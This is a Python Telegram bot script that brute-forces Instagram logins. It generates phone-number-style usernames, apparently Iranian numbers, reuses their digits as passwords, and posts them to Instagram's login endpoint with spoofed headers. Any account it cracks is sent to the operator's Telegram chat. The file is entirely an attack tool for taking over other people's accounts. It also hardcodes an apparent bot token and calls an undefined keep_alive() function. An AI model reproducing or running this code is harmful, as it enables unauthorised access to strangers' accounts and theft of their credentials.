import requests
from telebot import types
import telebot
from time import sleep
import random

token = ("5936926762:AAGKjjE9riozRnV7yvMPQaE4UH1MJED-xyg")
bot = telebot.TeleBot(token)
r=requests.session() 
co = types.InlineKeyboardButton(text ="- Start Checker ✅",callback_data = 'u_zzf')


@bot.message_handler(commands=['start'])
def start(message):
    use = message.from_user.username
    fr = message.from_user.first_name
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 2
    maac.add(co)
    bjj = message.chat.id
    bot.send_message(message.chat.id,text=f"""
Hello {fr}, 
- - - - - - - - - - 
اهلا بك في بوت صيد حسابات انستكرام 
اضغط على كلمه start Checker
- - - - - - - - - - 
Ch   : @u_zzf , @Abdullah_Abd_alsalam
    """,parse_mode='html',reply_to_message_id=message.message_id, reply_markup=maac)
@bot.callback_query_handler(func=lambda call: True)
def qwere(call):
    if call.data == 'u_zzf':
    	log(call.message)
def log(message):
 error =0
 done =0
 bot.send_message(message.chat.id,f" done bot ! ")
 while True:
        N = "09876543221"
        R = ''.join(random.choice(N)for t in range(7))
        user = '98912'+R
        pess = R
        url="https://www.instagram.com/accounts/login/ajax/"
        headers={
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '282',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'csrftoken=Z23MdmsOaneIBPSuevdvZ029aMVWl6vw; mid=YJHiTgALAAGMKBeVSlMKDoCAq3cC; ig_did=B77ECEEB-5C81-43CC-AA42-7108227B197C; ig_nrcb=1',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
        'x-csrftoken': 'Z23MdmsOaneIBPSuevdvZ029aMVWl6vw',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '05b80a16b1ac',
        'x-requested-with': 'XMLHttpRequest',
        }
        data = {
       'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(pess),
        'username':user,
        }
        respone = requests.post(url,headers=headers,data=data).text
        if "userId" in respone:
        	done+=1
        	bot.send_message(message.chat.id,f"New Account  insta ✅ \n username  : {user}\nPassword : {pess}\n ch  : @u_zzf",parse_mode="html")
        else:
        	error+=1
        	sleep(2)
        	mees = types.InlineKeyboardMarkup(row_width=1)
        	buut1 = types.InlineKeyboardButton(f" [❌] Error : {error}",callback_data='jhi')
        	buut2 = types.InlineKeyboardButton(f" [✳️] On  : {user}:{pess}",callback_data='jhi5')
        	buut3 = types.InlineKeyboardButton(f" [✅] Done : {done}",callback_data='jhi1')
        	buut4 = types.InlineKeyboardButton(f" [🧑‍💻]  Dev : ",url="https://t.me/u_zzf ",callback_data='jhi2')
        	buut5 = types.InlineKeyboardButton(f" [🇮🇶] : programming : ",url="https://t.me/Abdullah_Abd_alsalam ",callback_data='jhi9')
        	mees.add(buut1,buut2,buut3,buut4,buut5)
        	bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=" welcome To BoT insta 💗 ",parse_mode='markdown',reply_markup=mees) 
        
keep_alive()
bot.polling(True)
